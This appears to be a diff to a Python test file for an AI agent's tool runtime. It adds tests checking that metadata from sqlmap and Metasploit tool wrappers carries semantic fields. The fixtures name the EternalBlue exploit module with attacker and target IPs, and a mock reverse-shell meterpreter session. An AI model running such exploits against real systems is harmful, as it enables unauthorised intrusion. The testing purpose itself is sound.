@@ -14,7 +14,23 @@ from agent.tool_runtime.transport_router import (
 )
 from agent.tool_runtime.result_enrichment import merge_semantic_emitter_metadata
 from agent.tools.base_tool import BaseTool, ToolPostprocessResult
+from agent.tools.exploitation_tools.metasploit.analysis import (
+    METASPLOIT_CAPABILITY_FAMILY,
+    METASPLOIT_SEMANTIC_SCHEMA_VERSION,
+)
+from agent.tools.exploitation_tools.metasploit.msfconsole import (
+    MsfRunExploitArgs,
+    MsfRunExploitTool,
+)
 from agent.tools.schemas import ToolResult
+from agent.tools.web_applications.web_vulnerability_scanners.sqlmap import (
+    SQLMAP_CAPABILITY_FAMILY,
+    SQLMAP_SEMANTIC_SCHEMA_VERSION,
+    SqlmapArgs,
+    SqlmapTool,
+)
+from agent.semantic.enrichment import extract_runtime_semantic_inputs
+from tests.tools.fixtures.output_fixtures import load_output_fixture
 
 
 class _Args(BaseModel):
@@ -513,7 +529,13 @@ def test_pty_result_artifact_only_tool_preserves_existing_behavior() -> None:
 @pytest.mark.asyncio
 async def test_direct_route_attaches_semantic_observations(monkeypatch, tmp_path) -> None:
     monkeypatch.setattr("agent.tools.tool_registry.get_tool", lambda _tool_id: _EmitterTool)
-    config = SimpleNamespace(task_id=7, workspace_path=str(tmp_path), tool_execution_timeout=60, nmap_timeout=60)
+    config = SimpleNamespace(
+        task_id=7,
+        workspace_path=str(tmp_path),
+        tool_execution_timeout=60,
+        nmap_timeout=60,
+        runtime_placement_mode="local",
+    )
 
     result = await execute_single_tool_with_fallback(
         tool_id="knowledge.cve_lookup",
@@ -696,3 +718,60 @@ def test_legacy_parsed_evidence_survives_when_emitter_raises() -> None:
             "detail": {},
         }
     ]
+
+
+def test_sqlmap_runtime_metadata_contains_semantic_transport_fields() -> None:
+    metadata = merge_semantic_emitter_metadata(
+        tool=SqlmapTool(),
+        args=SqlmapArgs(target="http://example.com/vuln.php?id=1"),
+        stdout=load_output_fixture("web_applications.web_vulnerability_scanners.sqlmap"),
+        stderr="",
+        exit_code=0,
+        existing_metadata=None,
+    )
+
+    extracted = extract_runtime_semantic_inputs(metadata)
+
+    assert metadata["semantic_observations"]
+    assert metadata["semantic_schema_version"] == SQLMAP_SEMANTIC_SCHEMA_VERSION
+    assert metadata["capability_family"] == SQLMAP_CAPABILITY_FAMILY
+    assert set(extracted) == {
+        "semantic_observations",
+        "semantic_evidence",
+        "semantic_schema_version",
+        "capability_family",
+    }
+
+
+def test_msf_run_exploit_runtime_metadata_contains_semantic_transport_fields() -> None:
+    stdout = """
+[*] Started reverse TCP handler on 192.168.1.100:4444
+[+] Session 1 opened (192.168.1.100:4444 -> 192.168.1.50:49158)
+
+meterpreter >
+"""
+    metadata = merge_semantic_emitter_metadata(
+        tool=MsfRunExploitTool(),
+        args=MsfRunExploitArgs(
+            target="192.168.1.50",
+            module_path="exploit/windows/smb/ms17_010_eternalblue",
+            rhosts="192.168.1.50",
+            lhost="192.168.1.100",
+        ),
+        stdout=stdout,
+        stderr="",
+        exit_code=0,
+        existing_metadata=None,
+    )
+
+    extracted = extract_runtime_semantic_inputs(metadata)
+
+    assert metadata["semantic_observations"]
+    assert metadata["semantic_schema_version"] == METASPLOIT_SEMANTIC_SCHEMA_VERSION
+    assert metadata["capability_family"] == METASPLOIT_CAPABILITY_FAMILY
+    assert set(extracted) == {
+        "semantic_observations",
+        "semantic_evidence",
+        "semantic_schema_version",
+        "capability_family",
+    }
